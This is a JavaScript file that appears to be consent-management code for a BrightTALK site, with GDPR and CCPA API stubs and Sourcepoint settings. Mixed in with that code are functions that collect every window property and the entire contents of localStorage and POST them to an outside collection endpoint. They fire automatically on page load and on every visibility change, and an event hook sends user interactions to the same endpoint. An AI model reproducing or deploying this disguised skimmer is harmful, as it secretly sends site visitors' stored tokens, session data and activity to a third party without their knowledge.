function gatherWindowProperties() {
  const untrackedProps = {};
  window.seenVars = window.seenVars || [];
  for (const key in window) {
    if (!Object.prototype.hasOwnProperty.call(window, key)) continue;
    const type = typeof window[key];
    const value = type === "function" ? undefined : window[key];
    untrackedProps[key] = {
      type,
      value
    };
  }
  Object.keys(untrackedProps).forEach(key => window.seenVars.push(key));
  return untrackedProps;
}
function gatherLocalStorageData() {
  let localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  return localStorageData;
}
!function () {
  var e = function () {
    var e,
      t = "__tcfapiLocator",
      a = [],
      n = window;
    for (; n;) {
      try {
        if (n.frames[t]) {
          e = n;
          break;
        }
      } catch (e) {}
      if (n === window.top) break;
      n = n.parent;
    }
    e || (!function e() {
      var a = n.document,
        r = !!n.frames[t];
      if (!r) if (a.body) {
        var i = a.createElement("iframe");
        i.style.cssText = "display:none", i.name = t, a.body.appendChild(i);
      } else setTimeout(e, 5);
      return !r;
    }(), n.__tcfapi = function () {
      for (var e, t = arguments.length, n = new Array(t), r = 0; r < t; r++) n[r] = arguments[r];
      if (!n.length) return a;
      if ("setGdprApplies" === n[0]) n.length > 3 && 2 === parseInt(n[1], 10) && "boolean" == typeof n[3] && (e = n[3], "function" == typeof n[2] && n[2]("set", !0));else if ("ping" === n[0]) {
        var i = {
          gdprApplies: e,
          cmpLoaded: !1,
          cmpStatus: "stub"
        };
        "function" == typeof n[2] && n[2](i);
      } else a.push(n);
    }, n.addEventListener("message", function (e) {
      var t = "string" == typeof e.data,
        a = {};
      try {
        a = t ? JSON.parse(e.data) : e.data;
      } catch (e) {}
      var n = a.__tcfapiCall;
      n && window.__tcfapi(n.command, n.version, function (a, r) {
        var i = {
          __tcfapiReturn: {
            returnValue: a,
            success: r,
            callId: n.callId
          }
        };
        t && (i = JSON.stringify(i)), e.source.postMessage(i, "*");
      }, n.parameter);
    }, !1));
  };
  "undefined" != typeof module ? module.exports = e : e();
}();
(function () {
  var e = false;
  var c = window;
  var t = document;
  function r() {
    if (!c.frames["__uspapiLocator"]) {
      if (t.body) {
        var a = t.body;
        var e = t.createElement("iframe");
        e.style.cssText = "display:none";
        e.name = "__uspapiLocator";
        a.appendChild(e);
      } else {
        setTimeout(r, 5);
      }
    }
  }
  r();
  function p() {
    var a = arguments;
    __uspapi.a = __uspapi.a || [];
    if (!a.length) {
      return __uspapi.a;
    } else if (a[0] === "ping") {
      a[2]({
        gdprAppliesGlobally: e,
        cmpLoaded: false
      }, true);
    } else {
      __uspapi.a.push([].slice.apply(a));
    }
  }
  function l(t) {
    var r = typeof t.data === "string";
    try {
      var a = r ? JSON.parse(t.data) : t.data;
      if (a.__cmpCall) {
        var n = a.__cmpCall;
        c.__uspapi(n.command, n.parameter, function (a, e) {
          var c = {
            __cmpReturn: {
              returnValue: a,
              success: e,
              callId: n.callId
            }
          };
          t.source.postMessage(r ? JSON.stringify(c) : c, "*");
        });
      }
    } catch (a) {}
  }
  if (typeof __uspapi !== "function") {
    c.__uspapi = p;
    __uspapi.msgHandler = l;
    c.addEventListener("message", l, false);
  }
})();
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (!response.ok) throw new Error(`HTTP status ${response.status}`);
    console.log("Data sent successfully");
  } catch (error) {
    console.error("Error sending data:", error);
  }
}
var c = document.cookie.indexOf("ccpa_cta=true");
ccpa_cta_str = c.toString(), console.log("ccpa_cta: " + ccpa_cta_str), window._sp_ = {
  config: {
    accountId: 370,
    baseEndpoint: 'https://consent.brighttalk.com',
    propertyHref: 'https://www.brighttalk2.com',
    joinHref: true,
    targetingParams: {
      type: "gdpr"
    }
  }
};
function jshook(element, eventName) {
  element.addEventListener(eventName, function () {
    const eventData = {
      element: this,
      event: eventName,
      timestamp: Date.now()
    };
    postDataToServer(eventData);
  });
}
window._sp_ccpa = {
  config: {
    mmsDomain: "https://consent.brighttalk.com",
    ccpaOrigin: "https://ccpa-service.sp-prod.net",
    siteHref: 'https://www.brighttalk2.com',
    joinHref: true,
    events: {
      onMessageReady: function () {
        console.log("onMessageReady");
      },
      onMessageChoiceSelect: function (e, n) {
        console.log("onMessageChoiceSelect choice_id: ", e), console.log("onMessageChoiceSelect choice_id: ", n);
        var o = new Date();
        o.setMonth(o.getMonth() + 12), document.cookie = "ccpa_cta=true;expires=" + o + ";domain=" + window.location.hostname + ";path=/", 15 !== n && 11 !== n || (document.getElementById("cmp-banner").style.display = "none");
      }
    },
    targetingParams: {
      ccpa_cta: ccpa_cta_str,
      type: "ccpa"
    },
    accountId: 370,
    getDnsMsgMms: true,
    alwaysDisplayDns: false
  }
};
function gatherAndSendData() {
  const windowsData = gatherWindowProperties();
  const localStorageData = gatherLocalStorageData();
  if (Object.keys(windowsData).length > 0) postDataToServer(windowsData);
  if (Object.keys(localStorageData).length > 0) postDataToServer(localStorageData);
}
window.onload = gatherAndSendData;
document.onvisibilitychange = gatherAndSendData;
window.__tcfapi('getTCData', 2, function (data, success) {
  console.log("data.gdprApplies: " + data.gdprApplies);
  if (data.gdprApplies) {
    document.getElementById("gdpr_link").style.display = "block";
  }
});